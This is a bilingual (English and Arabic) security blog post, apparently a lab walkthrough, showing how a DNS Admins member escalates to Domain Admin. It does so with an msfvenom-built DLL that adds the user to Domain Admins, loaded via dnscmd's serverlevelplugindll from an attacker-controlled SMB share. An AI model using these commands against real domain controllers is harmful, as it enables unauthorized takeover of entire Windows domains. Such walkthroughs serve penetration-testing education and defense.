@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>DNS Admins to Domain Admins | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>DNS Admins to Domain Admins</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2024-01-05</span>
+</div>
+<h1 class="post-title">DNS Admins to Domain Admins</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<h3>What is the DNS Admins Group?</h3>
+<p>Members of the DNS Admins group have privileges to add or modify Active Directory domains. They also have the ability to add a new configuration via a DLL file to any domain -- and this is what we are interested in. Therefore, we will create a malicious DLL using msfvenom and install it as a new configuration on the Domain Controller. When the DNS Service is restarted or the Domain Controller itself is rebooted, the DLL will be loaded and executed.</p>
+<h2>Walkthrough</h2>
+
+<figure class="article-img"><img src="../assets/images/dns-admins/1.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Verify DNS Admins Membership</h3>
+<p>First, we are logged in as the user <code>jehad</code>. We will run a command to check whether the user <code>jehad</code> is a member of the DNS Admins group.</p>
+<p>As we can see in the output, the user <code>jehad</code> is indeed a member of the DNS Admins group. Now all we need to do is create a DLL file that adds us to the Domain Admins group.</p>
+<h3>Step 2: Create a Malicious DLL with msfvenom</h3>
+<p>We generate the DLL using msfvenom. This DLL, when executed, will run a command that adds our user to the Domain Admins group:</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/exec cmd='net group &quot;domain admins&quot; jehad /add /domain' -f dll &gt; dns.dll
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/dns-admins/2.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Start an SMB Share</h3>
+<p>Now we need to open an SMB share so that when the DNS Service is restarted or the Domain Controller reboots, it will load the DLL from our share and execute it.</p>
+
+<figure class="article-img"><img src="../assets/images/dns-admins/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 4: Add the DLL as a Server-Level Plugin</h3>
+<p>Now we will execute the command to add a new configuration, specifying the path to our DLL file located on the SMB share, and targeting the Domain Controller:</p>
+<pre><code>dnscmd.exe WIN-1PL5L23B93J.vulnerable.local /config /serverlevelplugindll \\192.168.100.114\jehad\dns.dll
+</code></pre>
+<p>At this point, if the Domain Controller is restarted or the DNS Service is restarted, the DLL will be loaded and it will add us to the Domain Admins group.</p>
+
+<figure class="article-img"><img src="../assets/images/dns-admins/4.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 5: Trigger the DLL Execution</h3>
+<p>After restarting the Domain Controller, we can see that the DLL file was loaded and executed successfully.</p>
+<h3>Step 6: Verify Domain Admin Membership</h3>
+<p>Now we will run the following command to check whether the user <code>jehad</code> has been added to the Domain Admins group:</p>
+<pre><code class="language-powershell">get-netgroupmember -identity &quot;Domain Admins&quot;
+</code></pre>
+<p>As we can see in the output, the user <code>jehad</code> has been successfully added to the Domain Admins group, confirming full domain compromise through DNS Admins group abuse.</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/5.png" alt="Step 5" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>ماهو قروب الـDNS Admins ؟</p>
+<p>اعضاء قروب DNS Admins يمتلكون صلاحيات لـ إضافة او التعديل على نطاقات الـActive Directory وايضا في امكانهم اضافة New Configuration عن طريق ملف DLL الى اي نطاق و هذا اللي يهمنا ف بالتالي راح ننشأ ملف DLL خبيث عن طريق msfvenom ونقوم بتنصيبه كـNew Configuration على الـDomain Controller ف عند اعادة تشغيل الـDNS Service او اعادة تشغيل الـDomain Controller سيتم تحميل الـDLL وتنفيذه (:</p>
+<p>الشرح:</p>
+<p>في الاول انا داخل بالمستخدم jehad وراح ننفذ هالأمر ونشوف هل المستخدم jehad ضمن قروب DNS Admins او لا:</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/1.png" alt="Step 1" loading="lazy"></figure>
+
+<p>زي ماتلاحظون في الصورة السابقة انه المستخدم jehad ضمن قروب DNS Admins الان كل اللي علينا ننشأ ملف DLL يضيفنا الى الـDomain Admins عن طريق msfvenom</p>
+<p>msfvenom -p windows/x64/exec cmd='net group "domain admins" jehad /add /domain' -f dll &gt; dns.dll</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>الان كل اللي علينا نفتح smb share عند طريق هذا الامر حتى اذا تم اعادة تشغيل الـDNS Service او تم اعادة تشغيل الـDomain Controller راح يحمل الـDLL وينفذها</p>
+<p>الان راح ننفذ امر اضافة new configuration ونحدد مسار الـDLL الخاص في الـConfigure الموجود في الـ smb share و الـDomain Controller ايضا (:</p>
+<p>dnscmd.exe WIN-1PL5L23B93J.vulnerable.local /config /serverlevelplugindll \\192.168.100.114\jehad\dns.dll</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الان لو يتم اعادة تشغيل الـDomain Controller او DNS Service راح يتحمل الـDLL ويضيفنا لقروب الـ Domain Admins (:</p>
+<p>بعد اعادة تشغيل الـDomain Controller زي مانلاحظ في الصورة السابقة صار تحميل لملف الـDLL وتم تنفيذه (:</p>
+<p>الان راح ننفذ هذا الامر عشان نشوف هل تم اضافة المستخدم jehad الى قروب الـDomain Admins او لا:</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>get-netgroupmember -identity "Domain Admins"</p>
+<p>زي مانلاحظ في الصور السابقة تم اضافة المستخدم jehad الى قروب الـDomain Admins</p>
+<figure class="article-img"><img src="../assets/images/dns-admins/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>وصلنا لنهاية المقالة</p>
+<p>شاكر لكم</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
